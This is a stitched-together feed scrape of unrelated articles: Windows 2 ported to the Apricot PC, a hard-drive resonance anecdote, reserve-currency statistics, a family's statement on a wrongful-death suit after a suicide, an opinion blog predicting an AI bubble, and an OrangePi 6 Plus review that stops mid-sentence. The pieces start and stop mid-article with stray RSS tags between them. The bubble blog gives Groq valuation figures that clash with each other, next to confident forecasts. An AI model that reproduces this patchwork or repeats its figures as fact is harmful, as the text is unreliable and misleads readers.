Windows 1. Neither were popular; GEM drivers were lost and re-created by John Elliot in 2012 or so. Windows 1 was thought to be lost.Hypothetically, it should be possible to port a 16-bit Windows to this computer. It would require creating , , , , and ideally  drivers. But that would be a lot of work.A screenshot of Windows 1 Notepad. I didn't have a Windows 1 Write screenshot at hand, but trust me, it looks almost the same.This is where things get interesting. A port of Windows 1 for the Apricot PC (released by ACT in 1987, a year before Windows 2) was miraculously preserved and surfaced online not that long ago. By itself, Windows 1 is unremarkable, as it does not have much useful software. But its driver architecture is not too different from Windows 2, so I thought it might be just about possible to make Windows 2 for the Apricot. And if I could somehow boot Windows 2, I'd be able to run Word, Excel, and Adobe Illustrator on my Apricot.Well, it only took two and a half years to pull it off!Porting Windows 2 on the ApricotEven today, software historians are still arguing whether Windows 2.0 deserves to be called a major Windows update. It added dozens of new kernel features, but it barely changed the driver architecture of the system. The mouse and the keyboard drivers for Windows 2 would work fine on Windows 1, and vice versa. The CGA and EGA video drivers from Windows 1 would allow Windows 2 to boot, but could not render the fonts correctly.A screenshot of Windows 2 for IBM PC with a broken video driver; all text on the screen is garbled.A natural thing to try would be installing Windows 2 with the Apricot drivers for Windows 1. Except that there are no .When you install Windows 1 or 2 on your computer, the SETUP utility combines (links) the driver files with the kernel. It is called "fast boot" and is supposed to improve the boot times of the system. The result of the SETUP is two files, WIN100.BIN and WIN100.OVL. The BIN file is an EXE file in disguise, consisting of the Windows kernel and the system drivers. The OVL file has resources and code that the system uses only from time to time.The Windows 1 port of Apricot was only ever distributed with the "fast boot". The individual driver files were not distributed, so we cannot use them.If there are no drivers, we can make some! Microsoft has a Driver Development Kit for Windows, also known as Windows DDK. The DDK comes with the drivers for the IBM PC, meant to be used as a reference for other platforms. With the help of the DDK, I implemented a stub video driver, and somehow got a stub mouse and system drivers. This was enough to confirm that Windows 2, indeed, can start on the Apricot PC without any patches to the kernel. I had my doubts about that, because Windows 2 comes with EMS memory support, and it might have been using something IBM PC-specific to test for it. Thankfully not.A screenshot of Windows 2 booting in the text mode. The file manager application simply dumps the list of files on the screen, without drawing any windows.Trying to write a video driverNow I could expand the drivers to support the Apricot PC. Keyboard, mouse, and even system drivers are small and simple. The real beast of a driver is DISPLAY.DRV, as it has to implement a large subset of the Windows graphical subsystem. With the reference display drivers, this should not be a problem, as long as the video card supports a graphical mode.But the Apricot PC doesn't have a real graphical mode. It has a 50x25 "graphics screen" with a fake 16x16 font. This is a big problem.A page of the Apricot technical reference explaining the organisation of the Video RAM.The reference video driver from Microsoft makes many bold assumptions about the way video RAM is organised. With the display initialisation routines corrected, the image produced by the reference driver is still undecipherable.A screenshot of the MAME emulator, running Windows 2 on the Apricot. There are no windows, only stripes of black.Writing a driver for such a video card is significantly more painful than designing a VGA-compatible video card for the Apricot. Maybe I return to the Apricot display driver project one day (for the Windows 3.0 port), but for now, I have given up on it.Lose the battle, win the war: re-linkingOriginally, I entertained the idea of unlinking the drivers from the WIN100.BIN/OVL files and reusing them, but rejected it. Not only is it difficult to do, but it is also useless, because the Windows 1 video driver would not display the fonts on the screen under Windows 2.But when I hit the roadblock with writing the driver from scratch, I got an idea: what if I use a driver from Windows 1 with fonts from Windows 1? Apparently, this trick works!  And so, I decided to abandon the video driver writing if I could somehow extract a video driver from the WIN100.BIN/OVL, because I would not need to reverse-engineer it to patch in the font support; it could work out of the box. But how?The driver files in WIN100 are not "simply concatenated together": some parts from DISPLAY.DRV ends up in WIN100.BIN, and some in WIN100.OVL. Looking closely at those parts, I realised that the part in WIN100.OVL is identical to the Hercules driver. This gave me an idea: I could get a Hercules video driver; then I could extract CODE and DATA segments along with the Entry Table from the WIN100.BIN, and patch them into the Hercules driver. Unfortunately, not a single NE file format tool supported this use-case. I ended up writing my own tool NExus-relink to assist in this process; the tool is still incomplete, but it gave me enough leverage to finish the job manually.For the video driver, I used a "combine" tool I made for NExus, and then manually patched in the offsets and lengths in the NE header (one for the entry table, two for the segments). Incredibly, this was enough to make Windows 2 happy about the display:A screenshot of Windows 2 running in the MAME emulator.The same trick worked for the keyboard driver, but the mouse driver gave me a headache. I knew that when the mouse is not found, Windows doesn't display it on the screen, so I kept iterating on the driver, going deeper and deeper. The mouse driver has a relocation table of the OS Fixup type, and there are very few things written about it, so I wasn't sure if the driver was loading correctly.I confirmed that the interrupt handler of the driver works, and was about to check the kernel source of the corresponding event handler when I discovered that, in fact, the mouse was working fine. It's just that the cursor wasn't displayed on the screen.In Windows 1/2, the cursor is handled by the video driver to allow hardware acceleration and "hide cursor before taking a screenshot or drawing a bitmap". So, why is the video driver not drawing the cursor?Windows DDK documentation has an answer: the mouse cursor drawing routines in the video driver are called by a timer routine, from the SYSTEM.DRV. I told about this to my fiancée, Atsuko, and she said: "Oh, you didn't notice the cursor wasn't blinking?"Turns out, the timer routines in the SYSTEM.DRV were broken. The SYSTEM.DRV from Windows 1.0 cannot be used with Windows 2, so I implemented the Apricot PC  using Windows DDK as a reference.With this driver complete, I had Windows 2 working on my Apricot PC/Xi.Welcome, welcome, let me show you around!I am greeted with the AUG logo when I power up my Apricot. I use the AUG BIOS because it supports the upgraded CPU, NEC V30, much better than the original one. Note that my machine has 896 kB of RAM.The PC/Xi comes with a single 720 kB floppy drive and a 10 MB hard drive. I have MS-DOS 3.20 installed on the hard drive.I have created a file called `win.bat` that simply starts the kernel.Welcome to Windows 2. I have GW Basic, Turbo Pascal, Windows 1, Windows 2, Word and Excel installed on the hard drive, and I still have almost 2 megabytes free.PC Paintbrush is one of the few programs that work on both Windows 1 and Windows 2. But it is more stable when running on top of Windows 2. Note that this is not Microsoft Paint **yet**: Microsoft would license this product only for its Windows 3.0 release.I have to remind you that the screen is . Pixel dithering works really well on a 100 PPI 800x400 display, creating shades of grey from pixel patterns.The screen is 4:3, so the pixels are not square. I have to pre-process raster images so they would look right on the Apricot's screen. Vector images are fine, though.The default shell for Windows 2 is a bit too minimalistic to my taste. WANG's ClearView for Windows 2 brings a familiar to Windows 3 users PROGMAN-like experience to the Apricot.Windows 1 came with tiling windows; Windows 2 uses overlapping windows that quickly become a disorganised mess. ClearView's window manager can arrange the windows for you.Windows 2 control panel looks a bit funny in monochrome, but it is a powerful reminder that Windows supports 24-bit colour, which is important for printing and publishing.A side note: Apricot's keyboard had an LED in the logo before ThinkPad did.The MicroScreen and re-programmable keys are fully supported by the Windows keyboard driver. There is no ALT key, so "Close" is as close as we can get to pressing ALT+f4. Note that there is a hotkey for starting the XENTEL telephone accessory. The XENTEL button is somewhat similar to a Copilot button, except it can actually be useful in some situations.Microsoft Word for Windows. Word for DOS, a completely different program, was first released back in 1983. Word for Windows had its first release in late 1989 due to a non-competition agreement with Apple. The success of Word for Windows made Microsoft abandon Word for DOS and Word for Mac; all the new versions of Word were based on  Word.Word for Windows is surprisingly powerful for a brand-new product. There is a spellchecker, a page layout editor, and even support for macros. I have deleted the macros to save space on the hard drive, so the README file shows "Error!" where the macros were. The files created by Word for Windows 1.0 can be opened by modern office suites if you save as RTF.Microsoft Excel is a real must-have. There is no other spreadsheet as powerful as Excel on the Apricot.Excel for Windows from 1988 looks almost exactly like Excel for Windows from 2018.My previous trip to Japan was planned between Google Docs and Excel for Windows 2 (I had to convert the file back and forth). I needed a few GB of RAM for Google Docs, and only a few hundred kilobytes for Excel.Excel Help is a hidden gem. It is a hypertext application that feels a lot like a web browser.I used the Help application to see how to create a stonks chart.Creating a stonks chart is surprisingly easy. There are 44 chart types, more than many modern programs offer.Until yesterday, Apricot PC had five graphical games: Chess, Where Is The Owl, Windows 1 Reversi, Windows 1 Minesweeper, and Windows 1 Risk. Now there are many more, including a solitaire and a Taipei mahjongg.That's it! There are many Windows 2 programs I have yet to try on the Apricot, but my quest for running modern-ish Word and Excel for Windows is finally over.My fiancée not only helped with beta-testing, she even designed a RAM expansion board for the Apricot PC/Xi that was necessary to run Windows on it.

Not an artistic judgement.One discovery during the investigation is that playing the music video also crashed some of their competitors’ laptops.And then they discovered something extremely weird: Playing the music video on one laptop caused a laptop sitting nearby to crash, even though that other laptop wasn’t playing the video!It turns out that the song contained one of the natural resonant frequencies for the model of 5400 rpm laptop hard drives that they and other manufacturers used.The manufacturer worked around the problem by adding a custom filter in the audio pipeline that detected and removed the offending frequencies during audio playback.And I’m sure they put a digital version of a “Do not remove” sticker on that audio filter.

They did not. They added a little to their holdings. But they added more assets denominated in other currencies, particularly a gaggle of smaller currencies whose combined share has surged, while central banks’ holdings of USD-denominated assets haven’t changed much for a decade, and so the percentage share of those USD assets continued to decline.As the dollar’s share declines toward the 50% line, the dollar would still be by far the largest reserve currency, as all other currencies  would weigh as much as the dollar. But it does have consequences.Why is having the top reserve currency important for the US?Foreign central banks buying USD-denominated assets, such as Treasury securities, helps push up prices and push down yields of those assets. Being the dominant reserve currency had the effect of helping the US borrow more cheaply to fund its huge twin deficits – the trade deficit and the budget deficit – and thereby has enabled the US to run those huge twin deficits for decades. At some point, this continued decline as a reserve currency, as it reduces demand for USD debt, would make the trade deficit and the budget deficit more difficult to sustain.The dollar’s share had already been below 50% before, in 1990 and 1991, after a long plunge from the peak in 1977 (share of 85.5%). This plunge accompanied a deep crisis in the US with sky-high inflation and interest rates, and four recessions over those years, including the nasty double-dip recession. Central banks lost confidence in the Fed’s willingness or ability to do what it takes to get this inflation under control that had washed over the US in three ever larger waves.The dotted line in the chart below indicates the 50%-share. The dollar’s share bottomed out at 46% in 1991, by which time the Fed had brought inflation under control, and soon, central banks began loading up on dollar-assets.Then came the euro, which turned into the next set-back for the dollar, but not nearly as much as European politicians had promised when pushing the euro through the system; they were talking about parity with the dollar. That talk ended with the Euro Debt Crisis that began in 2009.Then, over the past 10 years, came dozens of smaller “non-traditional reserve currencies,” as the IMF calls them.The chart shows the dollar’s share at the end of each year, except 2025 where it shows the share in Q3:But they didn’t actually dump USD-denominated securities.Foreign central banks increased their holdings of USD-denominated assets by a hair in Q3 to $7.4 trillion, the third increase in a row.Since mid-2014, despite some sharp ups and downs, their holdings of USD-assets have remained essentially flat.So, what has caused the percentage share of USD assets to decline over the years is the growth of foreign exchange reserves denominated in other currencies, particularly many smaller currencies, as central banks have been diversifying their growing pile of foreign exchange assets.The chart below shows foreign central banks’ holdings of USD-denominated assets – US Treasury securities, US MBS, US agency securities, US corporate bonds, etc. – in trillions of dollars:The top foreign exchange reserves by currency.Central banks’ holdings of foreign exchange reserves in all currencies, and expressed in USD, rose to $13.0 trillion in Q3.Top holdings, expressed in USD:USD assets: $7.41 trillionEuro assets (EUR): $2.65 trillionYen assets (YEN): $0.76 trillionBritish pound assets (GBP): $0.58 trillionCanadian dollar assets (CAD): $0.35 trillionAustralian dollar assets (AUD): $0.27 trillionChinese renminbi (RMB) assets: $0.25 trillionThe euro’s share, #2, has been around 20% since 2015. Before the Euro Debt Crisis, it was on an upward trajectory and had already risen to nearly 25%.The rest of the reserve currencies are the colorful spaghetti at the bottom of the chart (more in a moment). Combined, they have gained share over the years, at the expense of the dollar, while the euro’s share has remained roughly stable since 2015.The rise of the “non-traditional” reserve currencies.The chart below takes a magnifying glass to the colorful spaghetti at the bottom of the chart above.The soaring red line shows the combined surge of assets denominated in dozens of smaller “nontraditional reserve currencies,” as the IMF calls them. Combined, they reached a share of 5.6%, just below the yen-denominated assets (5.8%).But the share of the RMB (yellow) has been declining since Q1 2022, and its share is now back where it had been in 2019, amid ongoing capital controls, convertibility issues, and a slew of other issues.In other words, the USD and the RMB both have given up share to the “non-traditional reserve currencies” as other central banks have been diversifying away from assets denominated in USD and RMB.Enjoy reading WOLF STREET and want to support it?

Instead, we’re left marking that milestone without her -- remembering all that she was and grieving all that should have been.

Annie died by suicide last year, after being fired by MongoDB while she was on disability leave. 
 
Yesterday, we filed a legal complaint against MongoDB, seeking accountability for Annie’s wrongful termination and wrongful death. The complaint alleges as follows:

Annie was on leave receiving intensive mental health treatment when MongoDB demanded her immediate return to work. She asked for an extension to complete her treatment, or at the least a short period to consult with her medical providers about whether and how she might be able to return to work before the treatment was completed. Instead, MongoDB terminated her health insurance and then fired her in violation of the Americans with Disabilities Act and the New York State and City Human Rights Laws. Shortly afterward, Annie took her own life.

An extension of Annie’s leave would have cost MongoDB nothing. We made it clear that they did not need to pay her or hold her job open for her. We just asked them not to fire her while she was in such a vulnerable state, as we feared that would result in tragedy. We just wanted a little more time to get her stabilized.

We understand MongoDB may have told some of Annie’s colleagues that she quit. That is not true. MongoDB fired her.

We’re pursuing this case to set the record straight and to help ensure that powerful companies like MongoDB do not continue to violate the rights of their employees.]]></content:encoded></item><item><title>Nvidia just paid $20B for a company that missed its revenue target by 75%</title><link>https://blog.drjoshcsimmons.com/p/nvidia-just-paid-20-billion-for-a</link><author>joshcsimmons</author><category>dev</category><pubDate>Sat, 27 Dec 2025 16:47:13 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[If you’ve heard “Grok” thrown around lately, you’re probably thinking of Elon’s chatbot from xAI. We’re not talking about that one. That model isn’t particularly good, but its whole value prop is being politically incorrect so you can get it to say edgy things.The company Nvidia bought is Groq (with a Q). Totally different beast.a while to generate a response.a processor that does a specific type of task really well.So imagine you’re talking to Gemini and it takes a couple seconds to respond. Now imagine it responded instantly, like 10 or 100 times faster. That’s the problem Groq was solving.To go one level deeper on LPUs versus GPUs (the processors most LLMs run on, typically Nvidia cards): those GPU calculations have to access a lot of things in memory. Nvidia’s chips depend on HBM, high bandwidth memory. But LPUs use something called SRAM that’s much faster to reference.Think about it like this. Your wife has a grocery list for you. You go to the store but forget the list. Every time you’re in an aisle, you have to call her on the phone: “Hey, do I need anything from the bread aisle?” Get the bread. Put the phone down. Go to the next aisle. “Hey, do I need anything from canned goods?” And so on through produce, meat, pick up the beer, check out, get home. Very inefficient.Groq’s approach is like you just took the list to the store. Get to a new aisle, look at the list. Next aisle, look at the list. Much faster than a phone call.That’s the key difference. Nvidia GPUs are phoning out every time they hit a new aisle. Groq’s LPUs mean the shopper has the list in their pocket.Groq’s main offering is GroqCloud. An engineer like me isn’t going to go out and buy an LPU (I don’t even know if they’re commercially available). What I’m going to do is, if I need lightning fast response in an application I’m building, I’ll use GroqCloud. That inference happens at an extremely fast rate, running on LPUs in a data center somewhere.Their value prop is: fast, cheap, low energy.Where they’ve been falling short is they mostly use open source models. Llama, Mistral, GPT-OSS (OpenAI’s open source offering). These are decent models, but nowhere near the quality of something like Anthropic’s Opus 4.5 or Gemini 3 Pro.Groq positioned themselves for hardcore use cases where milliseconds matter. One of their big industry fits is real time data analysis for Formula 1. When your driver’s out there on the track, you don’t have time to send a query to Gemini and wait 20 to 30 seconds to figure out if you should pit this guy for new tires this lap. You want something like Groq which does pretty good analysis, really really really fast.This is insider baseball you’re going to miss from mainstream news headlines. The media is paying attention to Grok (Elon’s chatbot), not Groq (the chip company). This isn’t a conspiracy, it’s just that the only people aware of Groq are software developers and tech nuts like me.This is a canary in the coal mine for worse things to come in 2026.About a year ago, Groq announced a $1.5 billion infrastructure investment deal with Saudi Arabia. They also secured a $750 million Series D funding round. These are crazy multiples even for a software company that’s somewhat leveraged in hardware. Bubble level projections.To visualize $1.5 billion: if you cashed that check out in $100 bills and stacked them one on top of another, it would reach a five story building. For ordinary plebeians like us, at the average US salary of around $75K, you’d need to work 20,000 years to earn that.At that time, the company was valued at $2 billion. Hello bubble.This was a company valued at $2 billion, enough that the government of Saudi Arabia was investing at that valuation. Then they took a 75% haircut four months later without anything major happening.If it can happen to Groq, who else can it happen to? Nvidia? Intel?The rumors started flying on Christmas Eve. Confirmed the 26th: Nvidia will be buying Groq, their key product line, and key personnel including the CEO, for $20 billion.Let’s walk through that again:February: $2 billion valuationJuly: Down to $500 millionDecember: Nvidia buys them for $20 billion after they took a 75% haircutWhat is going on? This is a bubble.The only explanation is this is a fear purchase. Groq was promising faster, cheaper, more efficient, less electricity use for their chips. But they couldn’t scale fast enough to compete with the vendor lock in and buddy system Nvidia has going.Nvidia’s buying them with their insanely inflated war chest. They don’t want a chunk taken out of their market share. They can’t afford to take that chance. So it’s like they’re just saying: “Shut up, take the $20 billion, walk away from this project.”This is a sign that in order to succeed, Nvidia needs a monopoly on the market. Otherwise they would not pay ten times the company’s valuation that was then decreased by 75%. This is a desperate move to consolidate the market into “you have to go with us.”Saudi Arabia didn’t keep that $1.5 billion sitting around. They redirected it to Nvidia and AMD instead. Nvidia still gets paid ofc.Ain’t nobody buying it right now.Google made their own chip. Microsoft and Amazon are racing to make competition chips that run on less electricity, are more efficient, faster. But no matter what anybody does, the market is consolidating around the Nvidia monopoly for AI hardware. Engineers like me and architects at large enterprises are trying to escape this. Once they consolidate enough of the market, they can set their price for chips and usage. If you don’t own them, you go through Oracle or some cloud computing service, and they can charge whatever they want because there will be no competitors. Even a competitor having a rough time but getting some traction? They just buy them out for $20 billion because with this monopoly going, that’s pocket change.$20 billion is a rounding error to Nvidia.The AI infrastructure boom ran on one large errant assumption: that power is cheap and plentiful. You and I are going to pay to subsidize the electricity constraints.US data centers are using about 4% of all electricity right now. If growth continues at the same rate, in ten years they’ll use 9%. Almost one tenth of all electricity generated in the US.I’m not much of an environmentalist. But even someone like me, pretty jaded to some amount of waste because of industrialization, something like this actually makes my stomach turn. In places with lots of data centers, AI heavy regions, they’re experiencing about a 250% increase in energy costs compared to just five years ago. That’s huge. Even compared to grocery costs, which are out of control. At least with food you have alternatives. Red meat too expensive? Buy chicken. Chicken too expensive? Buy eggs. But electricity? You have to run electricity. It’s a public utility. You can’t just “use a lot less” when your bill goes up 2.5x.Let me walk you through what happens. Some business development guy from Oracle wants to build a new data center in Rural America. A year before it’s even built, they meet with city officials, maybe the governor. They grease the right people. Get legislation passed with the utility companies that says they’ll pay a preferential rate for electricity because they’re going to use a shit ton.They’re Oracle or Nvidia, they’re good for it. They pay five years upfront. Then the utility decides what to do with the rest of the electricity. The grid is strained. They want everyone else to use less. They can’t just tell them to use less, so they keep raising the price until naturally you just can’t afford to use more.You turn the lights off. Turn the TV off. Get those LED bulbs that disrupt your sleep. Do everything to keep electricity costs down. But you and I are left holding the bag. The data center folks aren’t paying for that, they paid upfront at a preferential rate.Senate Democrats are allegedly investigating this. I’ll believe it when I see it. These tech companies have their hooks so far into influential politicians. It’s a vote grab. I’d be happy to be wrong about that, but I know I’m not going to be.I talked about this in my last piece on the AI bubble. This computer communism that’s going on, pricing you out of personal computing, keeping it all in the family of these tech companies. But with the Groq deal confirmed, it’s gone one step further. Nvidia is not just selling chips anymore. They are lending money to customers who buy the chips. They are artificially inflating demand.It’s like if I run a small grocery store and I need to show good signal to investors that I’m bringing cash in the door. So I go downtown during farmer’s market and give everybody a $20 voucher to use at my store. I take a wholesale hit when they come in and buy stuff. But what I can show is: “Hey, people are coming in and spending money. Look at the revenue. Give me more venture capital money.”This can’t work infinitely, for the same reason any perpetual motion machine can’t work.They’re playing both sides. In the OpenAI case, they’re financing software that uses their chips. But they’re also getting their hooks into data centers.CoreWeave: they have something like 7% share in the company. Worth $3 billion. That’s funded by GPU revenue from CoreWeave.Lambda: another data center operator. That’s a $1.3 billion spending deal. Renting Nvidia’s own chips back from them.They’ve pledged to invest £2 billion across British startups, which of course are going to go back to Nvidia chips one way or another.In 2024, they invested about $1 billion across startups and saw a $24 billion return in chip spend. They 24x’d their billion dollar investment in one year. Nvidia has more power than the Fed right now. More power than the president over the economy. They have their hand on the knob of the economy. They can choose how fast or slow they want it to go. If the Nvidia cash machine stops printing, if they stop funding startups, data centers, hardware companies, software companies, that whole part of the economy slows way down and maybe crashes if investors get spooked.I’m waiting for somebody to blow the whistle on this. I’m not a finance guy, so it’s strange I’m even talking about it. But their entire success story for the next couple years hinges on their $100 billion investment in OpenAI, which they’re expecting to bring back about $300 billion in chip purchases.I cannot believe more people are not talking about this.OpenAI, the leader of this space, the company whose CEO Sam Altman is invited to the White House numerous times, probably has a direct line to Trump, a lot of the economy hinges on this guy’s strategy, opinions, and public statements.And he runs a company that is not profitable. By that metric, I’m richer than Sam Altman. Not in net worth. But if I consider myself a business and the fact that I bring in any salary at all, even a dollar a year, that would make me earn more than Sam Altman, who has only lost money. In the next few years, they’re expected to burn something like $75 billion a year. Just set that money on fire. I have a credit card with no preset spending limit, but I assume if I run up a $75 billion charge it’s going to get denied. By their projections, they think they’ll become profitable around 2029/2030, and they need $200 billion in annual revenue to offset their debts and losses.To visualize $200 billion: if you cashed that out in $100 bills and stacked them, it would reach halfway to the International Space Station. That’s how much they’d have to make every single year to just be profitable. Not be a massively successful company. Just to not spend more than they earn.2024: Spent $5 billion, earned $3.7 billion. Spending $1.35 for every dollar earned.2025: Set $8 billion on fire (after profits).2028 (projected): Will lose $74 billion that year. Just lose it.Cumulative losses through 2029: $143 billion.They’d need to make $200 billion in a year to offset that. Are they including interest? I have no idea how these things work, but in simple terms: they’re spending a lot more money than they make.Groq was kind of a one off because Nvidia panic bought the competition. But they also need to figure out how to get prices down or they can’t keep this money machine moving.Groq is probably one of the last companies that caught a good lifeboat off a sinking ship.What we’re going to see this year: it’ll start small, but get major. A company first, then multiple larger ones, that had a 2025 valuation, will go to raise. They’ll do a 409A evaluation. A bunch of smart analysts will say what it’s worth to investors. And you’re going to see the valuation drop. They won’t be able to raise money.Then the shit is really going to start to hit the fan.The dominoes will start falling. That’s probably what kicks off the actual pop, and it’s imminent. Any day now.Part of the big gamble they’ve sold investors is: we’ve got to replace you. The worker. That’s why we need to spend so much money, go into debt. It’ll all be worth it because then we won’t have to pay people to do these jobs anymore.We’re going to continue to see massive labor displacement. To a degree this is a shell game, an investor illusion. What these larger enterprise companies are hoping to do: cut a lot of folks, have big layoffs, say it’s because AI is replacing the jobs.In some cases they’re right. Data entry, for example. I don’t mean to be mean if you do data entry for a living, but there are models very good at that now. You need someone to manage the work, spot check it. But it’s kind of a job AI can do.Like how grocery stores have automatic checkout lines now with one person monitoring six or eight of them. So some of that’s real. A lot of it isn’t though.They cut a bunch of American workers under the guise that AI’s replacing workers. A lot of these megacorp execs are actually convinced of it. Americans are expensive, especially tech workers.Then they see: damn, maybe we could have cut some, but not as many. We got greedy. Now our services are failing in production. AWS in Northern Virginia is flaky, going down again. That just happened, by the way, direct result of these layoffs.So instead they think, “We’ll look globally! Spin up a campus in Hyderabad!” Pay them way less. The cost of living is less there, they expect less. Bring them over on H-1B when needed. I’ve written about the H-1B program. This is nothing against the individuals on that program. I’ve worked with very talented H-1Bs, and some very inferior ones, just like American citizens.But the corporate sleight of hand is something like this, we can get those H-1B visas, and they’re not going to ask for pesky stuff like Sunday off for church. We can put them on call 24/7 and they can’t say no because if they do, we kick them back to their country. Same thing that’s happened with migrant labor in farming over the past century. Even if it doesn’t look like it on the surface, corporations know that they can pay H-1B employees less than American citizens. If a US citizen and H-1B recipient both make $120k but the H-1B works double the hours because they have no room to push back and are under threat of being sent home, they are making 50% less than the American per-hour.Amazon/AWS: 14,000 laid off.Microsoft: 15,000 total just in 2025.Salesforce: My favorite one. 4,000 customer support roles cut. And the CEO is gloating about it in interviews. So great that he can replace workers!Not only would they monitor all usage across employees, specifically who’s using it how much, they could see every single message being sent to the AI. So theoretically you could check somebody’s queries and do a performance evaluation based on where you perceive them to be.They’re using yesterday’s tools because of regulation and compliance, blowing an absurd amount of money. The CEO just sees a lot going out the door: “I thought these were supposed to save money, what’s going on here?” So his lieutenants have to get a grip on it, monitor everything. Even at Amazon this is being included in performance reviews, how much they’re using AI.That’s why if you’re a software developer wondering why your boss is on you about using AI tools. They’re probably getting pressure from their bosses. I want my engineers to be as productive as possible. I think AI is probably part of that tool belt for everyone at this point. But is tracking it really the best way? I’m going to gauge performance on metrics, how you interacted with the team, what you shipped. It puts the cart before the horse to say you’re paid by how much you use these AI tools. If I’m a developer, I’m just spinning up a script to send lorem ipsum text 24 hours a day, get maximum ratings because I used GPT-3.5 the most.MIT did a study in summer 2025. They’re saying 95% of companies report zero measurable ROI on AI products.Actually not that crazy if you consider that a lot of them did layoffs and subbed in AI. That’s just going according to plan in my estimation.They estimate about $30 to $40 billion has been spent on enterprise AI. That’s the money your JPMorgan Chase is spending for their engineers to use Claude Code or whatever dated tool they have access to.The market heard that signal. When that study came out:Nasdaq in general down 1.2%That last one isn’t encouraging for an AI bubble pop because it indicates this is a big part of the economy.January through February: Maybe down valuations, just a very flat market without much growth.Q1 to Q2: We’ll start to see a couple businesses, or maybe one major one at first like a domino starting to fall, not able to raise capital at their 2025 valuation. We’ll see valuations go down. VCs will be like: “Not touching it, not giving them more money, cutting our losses.”Then timing a little more indeterminate but these things will happen quickly in succession:Credit markets start to tightenDebt refinancing pressure builds up in the systemNvidia revises its revenue guidance to something at least vaguely linked to realityAnd that’s when the big reckoning begins.I want to be clear. AI is not going anywhere. It’s going to continue being a mainstream part of the world. I like a lot of these tools, I think they’re very helpful.But the talking heads have really promised us the world. It’s clear the technology cannot deliver above and beyond what it’s doing now.We’ve seen progress of these models slow at an exponential rate of slowing over the past few releases. Each release is better, but the gap between the current release and the last release is much smaller than it used to be.Because of that, a lot of these AI companies are going to survive, but their valuations are going to get giga slashed.Valuations of $500 billion for OpenAI, $42 billion for Anthropic are unsustainable. We’re going to actually see them become unsustainable in 2026 as they’re eventually cut. Smaller companies will face those slashes first. But it’s coming for the major AI labs as well.This is good news, honestly. This AI hype has really turned tech into something different these days, different than it used to be. While I don’t feel AI is going anywhere, I do feel we’ll get a little more back to normal once this bubble pops and resolves.What do you think? Drop a comment below.

Today this is going to be about the , following our previous review of the OrangePi 5 ultra board.This is NOT a super small, credit card format SBC. We are talking about something that’s definitely larger, and that comes directly with an integrated heatsink.At the bottom there’s a wealth of ports, and it’s where you will install the necessary wireless module if you want Wifi and Bluetooth.Now let’s dive into what you can do with this.Here is what you can get from the top of the device. Note that most of it will be hidden from view as the board comes pre-installed with the heatsink that covers the SOC and the memory chips.You can tell just from the format that you should have higher expectations from the hardware.Specs of the OrangePi 6 PlusCIX CD8180 / CD8160 (12-core 64-bit)4× Cortex-A720 (High-perf) + 4× Cortex-A720 (Main) + 4× Cortex-A520 (Efficiency)Arm Immortalis-G720 MC10 (Ray Tracing & 8K Decoding support)Up to 45 TOPS (System-wide); ~30 TOPS Dedicated NPU16GB / 32GB / 64GB LPDDR5 (128-bit)2× M.2 2280 slots (PCIe 4.0 x4 NVMe), 1× MicroSD (TF) slotDual 5GbE (5000Mbps) Ethernet portsM.2 Key-E (2230) slot for Wi-Fi 6E/7 & Bluetooth 5.41× HDMI 2.1 (8K@60Hz), 1× DP 1.4, 2× USB-C (DP Alt Mode), 1× eDP2× USB 3.0 Type-A, 2× USB 2.0 Type-A, 2× Full-function USB Type-C2× 4-lane MIPI CSI interfaces40-pin GPIO header (UART, I2C, SPI, PWM, etc.)3.5mm Headphone/Mic jack, 2× Speaker headers, 1× Analog MIC header100W Dual USB Type-C PD (20V/5A)As you can see from the specs, this is no joke. 16GB RAM by default, 12-cores processor, with a powerful GPU (Immortalis G720), and a NPU that has a claimed performance up to 30 TOPS. Not just that, but there’s numerous ports on this SBC, with 2 full sized M2 2280 slots! You can tell that the IO is not going to be a joke here.If you are wondering about the SOC itself, we have more info about what to expect from CIX.CIX CD8180 / CD8160 (Codename: CIX P1)12 Cores (Tri-cluster configuration)4× Cortex-A720 @ Up to 2.8 GHz (Performance)4× Cortex-A720 @ Up to 2.4 GHz (Mainstream)4× Cortex-A520 @ 1.8 GHz (Efficiency)Hardware Ray Tracing, Vulkan 1.3, OpenGL ES 3.2, OpenCL 3.0Arm-China Zhouyi: 30 TOPS (Dedicated); ~45 TOPS (Total System AI)INT4, INT8, INT16, FP16, TF32Linlon V8: 8K@60fps Decode (AV1/H.265/VP9), 8K@30fps Encode (H.265)128-bit LPDDR5 / LPDDR5X (Up to 5500 MT/s)Up to 96 GB/s (Theoretical peak)PCIe Gen4 (Supports x8, x4, and x2 configurations)Integrated Security Engine (Standard Arm SystemReady / ACPI support)2.8Ghz ARM Big Cores processors! That’s no joke, this is way beyond the typical frequency we see for small boards where things are usually below 2 Ghz. The memory interface also has a huge bandwidth, and we get full PCI4 with 8 lanes! This means that this board could probably be attached to an external GPU (eGPU) and be able to drive it (provided adequate software support).About the NPU, the usual problem on Linux is that there is poor software support, and it’s certainly not in the mainline either. To leverage the 30 TOPS of dedicated AI power, you cannot simply use standard versions of PyTorch or TensorFlow out of the box. You must use the NeuralONE AI SDK. This also means that the NPU cannot use regular weights, and need to compile them into a different format to make them work. On paper, the NPU is highly versatile and supports the following data types: INT4, INT8, INT16, FP16, BF16, and TF32. The board has extensive documentation on a bunch of embedded models for vision detection, automation, such as YOLOv8 (Vision), ResNet50, OpenPose, and DeepLabv3.Now let’s jump into the actual user experience.There is a  (12) image available at the time of writing. I was actually waiting for a 24.04 Ubuntu image to be made available, and that was the plan at some point according to my  contact, but they had to shift priorities apparently and now there is no ETA for the Ubuntu image. So instead of waiting, I decided to go ahead and review what’s possible with this Debian image. As you know,  is not that new anymore (the base is from Mid-2023), and is now superseded by  (released in 2025). This Debian image comes with two kernels available, 6.1 and 6.6. The 6.6 kernel is also from 2023, and it’s not surprising you don’t get a more recent kernel, since the Linux support for various parts of the boards, not being upstreamed and mainlined, is very likely to be stuck on an older version. This is usually what causes headaches down the road: maybe some general functionality can be upstreamed, but will the NPU have working drivers for a more recent kernel? Your guess is as good as mine.You can burn the image directly on the NVME drive - no need to boot on a MicroSD card this time around. Note that at the beginning, my OrangePi did not boot, but I could see from the BIOS (yes, this board comes with a BIOS-like interface!) that everything was supposed to be seen by the SBC. Turns out that the firmware required an update to be able to boot on this Linux kernel, and after imaging the latest firmware on a USB stick and booting on it, a few minutes later, things worked as expected.In any case, we get a GNOME desktop after boot. And everything works pretty much as you’d expect. Once thing that is immediately apparent when you start with the desktop is how snappy everything is. SBC boards like the Raspberry Pi 